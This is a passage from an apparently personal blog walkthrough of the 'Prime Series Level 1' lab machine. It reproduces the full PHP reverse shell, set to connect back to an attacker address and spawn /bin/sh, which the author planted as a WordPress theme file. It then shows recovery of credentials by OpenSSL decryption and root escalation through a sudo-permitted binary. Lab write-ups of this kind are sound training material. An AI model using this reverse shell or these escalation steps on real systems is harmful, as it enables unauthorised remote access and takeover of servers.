class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line">  <span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line">  <span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="string">&#x27;192.168.48.133&#x27;</span>;  <span class="comment">// You have changed this</span></span><br><span class="line">  <span class="variable">$port</span> = <span class="number">8888</span>;  <span class="comment">// And this</span></span><br><span class="line">  <span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line">  <span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line">  <span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line">  <span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">    <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make the current process a session leader</span></span><br><span class="line">    <span class="comment">// Will only succeed if we forked</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change to a safe directory</span></span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove any umask we inherited</span></span><br><span class="line">  <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Do the reverse shell...</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open reverse connection</span></span><br><span class="line">  <span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Spawn shell process</span></span><br><span class="line">  <span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set everything to non-blocking</span></span><br><span class="line">  <span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Check for end of TCP connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for end of STDOUT</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line">    <span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">    <span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line">    <span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">  <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line">  <span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721161656-zejt723.png" alt="image">​</p>
<p>Accessing the URL <a target="_blank" rel="noopener" href="http://192.168.48.134/wordpress/wp-content/themes/twentynineteen/secret.php">http://192.168.48.134/wordpress/wp-content/themes/twentynineteen/secret.php</a> triggers a successful reverse shell.</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721171100-b2361ri.png" alt="image">​</p>
<h2 id="Privilege-Escalation-Method-One"><a href="#Privilege-Escalation-Method-One" class="headerlink" title="Privilege Escalation Method One"></a>Privilege Escalation Method One</h2><h3 id="Kernel-Privilege-Escalation"><a href="#Kernel-Privilege-Escalation" class="headerlink" title="Kernel Privilege Escalation"></a>Kernel Privilege Escalation</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">searchsploit ubuntu 4.10</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240723143629-wog5956.png" alt="image">​</p>
<h2 id="Privilege-Escalation-Method-Two"><a href="#Privilege-Escalation-Method-Two" class="headerlink" title="Privilege Escalation Method Two"></a>Privilege Escalation Method Two</h2><h3 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h3><p>After obtaining the shell, check if there is a possibility to escalate privileges using sudo.</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240803001039-2kp0c7g.png" alt="image">​</p>
<p>After obtaining the shell, check if there is a possibility to escalate privileges using sudo.</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240803001207-x3c4m2e.png" alt="image">​</p>
<p>When running enc, it is found that a password is required.</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240803001244-6evjnp0.png" alt="image">​</p>
<p>There should be a line of thought that if a program running on the system requires a password, it is possible that there is a backup of the password within the system. Therefore, you can search the system for backup files or password files.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;*backup*&quot;</span> <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>Discovered a suspicious file at &#x2F;opt&#x2F;backup&#x2F;server_database&#x2F;backup_pass.</p>
<p><img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240803001727-x4fvrxm.png" alt="image"></p>
<p>Obtained the password: backup_password, and entered it into the enc program.</p>
<p><img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240803002232-c1tqkf9.png" alt="image"></p>
<p>Generated enc.txt and key.txt files locally.</p>
<p><img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240803002525-lcxtrvg.png" alt="image"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=</span><br><span class="line">I know you are the fan of ippsec.</span><br><span class="line"></span><br><span class="line">So convert the string <span class="string">&quot;ippsec&quot;</span> into an md5 <span class="built_in">hash</span> and use it to gain yourself <span class="keyword">in</span> your real form.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="OpenSSL-Decryption"><a href="#OpenSSL-Decryption" class="headerlink" title="OpenSSL Decryption"></a>OpenSSL Decryption</h3><p>From enc and key, one should think of the encryption and decryption methods of OpenSSL.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">openssl enc --<span class="built_in">help</span></span><br><span class="line">Usage: enc [options]</span><br><span class="line"></span><br><span class="line">General options:</span><br><span class="line"> -<span class="built_in">help</span>               Display this summary</span><br><span class="line"> -list               List ciphers</span><br><span class="line"> -ciphers            Alias <span class="keyword">for</span> -list</span><br><span class="line"> -e                  Encrypt</span><br><span class="line"> -d                  Decrypt</span><br><span class="line"> -p                  Print the iv/key</span><br><span class="line"> -P                  Print the iv/key and <span class="built_in">exit</span></span><br><span class="line"> -engine val         Use engine, possibly a hardware device</span><br><span class="line"></span><br><span class="line">Input options:</span><br><span class="line"> -<span class="keyword">in</span> infile          Input file</span><br><span class="line"> -k val              Passphrase</span><br><span class="line"> -kfile infile       Read passphrase from file</span><br><span class="line"></span><br><span class="line">Output options:</span><br><span class="line"> -out outfile        Output file</span><br><span class="line"> -pass val           Passphrase <span class="built_in">source</span></span><br><span class="line"> -v                  Verbose output</span><br><span class="line"> -a                  Base64 encode/decode, depending on encryption flag</span><br><span class="line"> -<span class="built_in">base64</span>             Same as option -a</span><br><span class="line"> -A                  Used with -[<span class="built_in">base64</span>|a] to specify <span class="built_in">base64</span> buffer as a single line</span><br><span class="line"></span><br><span class="line">Encryption options:</span><br><span class="line"> -nopad              Disable standard block padding</span><br><span class="line"> -salt               Use salt <span class="keyword">in</span> the KDF (default)</span><br><span class="line"> -nosalt             Do not use salt <span class="keyword">in</span> the KDF</span><br><span class="line"> -debug              Print debug info</span><br><span class="line"> -bufsize val        Buffer size</span><br><span class="line"> -K val              Raw key, <span class="keyword">in</span> hex</span><br><span class="line"> -S val              Salt, <span class="keyword">in</span> hex</span><br><span class="line"> -iv val             IV <span class="keyword">in</span> hex</span><br><span class="line"> -md val             Use specified digest to create a key from the passphrase</span><br><span class="line"> -iter +int          Specify the iteration count and force the use of PBKDF2</span><br><span class="line">                     Default: 10000</span><br><span class="line"> -pbkdf2             Use password-based key derivation <span class="keyword">function</span> 2 (PBKDF2)</span><br><span class="line">                     Use -iter to change the iteration count from 10000</span><br><span class="line"> -none               Don<span class="string">&#x27;t encrypt</span></span><br><span class="line"><span class="string"> -saltlen +int       Specify the PBKDF2 salt length (in bytes)</span></span><br><span class="line"><span class="string">                     Default: 16</span></span><br><span class="line"><span class="string"> -z                  Compress or decompress encrypted data using zlib</span></span><br><span class="line"><span class="string"> -*                  Any supported cipher</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Random state options:</span></span><br><span class="line"><span class="string"> -rand val           Load the given file(s) into the random number generator</span></span><br><span class="line"><span class="string"> -writerand outfile  Write random data to the specified file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Provider options:</span></span><br><span class="line"><span class="string"> -provider-path val  Provider load path (must be before &#x27;</span>provider<span class="string">&#x27; argument if required)</span></span><br><span class="line"><span class="string"> -provider val       Provider to load (can be specified multiple times)</span></span><br><span class="line"><span class="string"> -propquery val      Property query used when fetching algorithms</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>From the keywords “key” and the usage instructions, it can be deduced that in OpenSSL, the key needs to be input in hexadecimal format. Therefore, the MD5 of “ippsec” must be converted into a hexadecimal string.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n ippsec | <span class="built_in">md5sum</span> | awk -F <span class="string">&quot; &quot;</span> <span class="string">&#x27;&#123; print $1 &#125;&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | <span class="built_in">od</span> -A n -t x1 | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">3336366137346362336339353964653137643631646233303539316333396431</span><br><span class="line"></span><br><span class="line"><span class="comment"># tr -d &#x27;\n&#x27; removes the newline characters from the string</span></span><br><span class="line"><span class="comment"># tr -d &#x27; &#x27;  removes the spaces from the string</span></span><br><span class="line"><span class="comment"># od -A n -t x1 &#x27;od&#x27; is a Linux system command for dumping files into octal or other numeral systems. -A # specifies RADIX as one of the four in doxn, the example chooses none, -t # specifies the type, the example specifies x1</span></span><br></pre></td></tr></table></figure>
<p>The OpenSSL decryption method involves using the <code>openssl enc</code> command with appropriate flags to decrypt the encoded data. Here is a general approach to decrypting data with OpenSSL, based on the command you provided:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;your_encoded_string&#x27;</span> | openssl enc -d -a -CipherType -K <span class="string">&#x27;your_hex_key&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>-n</code>: Suppresses the output of the trailing newline character.</li>
<li><code>-d</code>: Indicates decryption.</li>
<li><code>-a</code>: Specifies that the input is Base64 encoded.</li>
<li><code>-CipherType</code>: Specifies the cipher to use for decryption. You need to know the cipher type used during encryption to specify this correctly.</li>
<li><code>-K</code>: Specifies the key in hexadecimal format.</li>
</ul>
<p>To guess the <code>-CipherType</code> parameter, you would typically try common cipher types used with OpenSSL. Here are some common cipher types you might try:</p>
<ul>
<li><code>aes-128-cbc</code></li>
<li><code>aes-192-cbc</code></li>
<li><code>aes-256-cbc</code></li>
<li><code>des-ede3-cbc</code> (Triple DES)</li>
<li><code>rc4</code></li>
</ul>
<p>If you do not know the cipher type used, you will have to try each one in turn until you find the correct one that successfully decrypts the data.</p>
<p>Please note that the actual cipher type and key must match those used during the encryption process for the decryption to be successful. If you have the encrypted data and the key but not the cipher type, you may need to perform some trial and error to find the correct cipher type.</p>
<h4 id="String-Processing"><a href="#String-Processing" class="headerlink" title="String Processing"></a>String Processing</h4><p>Copy all the CipherTypes into the Cipher file.</p>
<p><img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240805161855-9knjt4h.png" alt="image"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> Cipher | awk <span class="string">&#x27;&#123; print $1 &#125;&#x27;</span> &gt; 1.txt &amp;&amp; <span class="built_in">cat</span> Cipher | awk <span class="string">&#x27;&#123; print $2 &#125;&#x27;</span> &gt; 2.txt &amp;&amp; <span class="built_in">cat</span> Cipher | awk <span class="string">&#x27;&#123; print $3 &#125;&#x27;</span> &gt; 3.txt</span><br><span class="line"><span class="built_in">cat</span> 1.txt 2.txt 3.txt &gt; Cipher</span><br></pre></td></tr></table></figure>

<p>Final result</p>
<p><img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240805162000-hxsyiyq.png" alt="image"></p>
<h4 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> Cipher <span class="keyword">in</span> $(<span class="built_in">cat</span> Cipher); <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&#x27;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&#x27;</span> | openssl enc -d -a -<span class="string">&quot;<span class="variable">$Cipher</span>&quot;</span> -K 3336366137346362336339353964653137643631646233303539316333396431 2&gt;/dev/null; <span class="built_in">echo</span> <span class="variable">$Cipher</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240805165651-4ucftc2.png" alt="image"></p>
<p>Password: tribute_to_ippsec</p>
<p>Username: saket</p>
<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>Log in to the target</p>
<p><img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240805171337-wwcjlkh.png" alt="image"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240805174821-afp2mi9.png" alt="image"></p>
<p><img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240805174923-u6ulm5v.png" alt="image"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; challenge</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt;&gt; challenge</span><br><span class="line"><span class="built_in">chmod</span> +x challenge</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240805175025-g28eayg.png" alt="image"></p>
<p>Privilege escalation successful.</p>
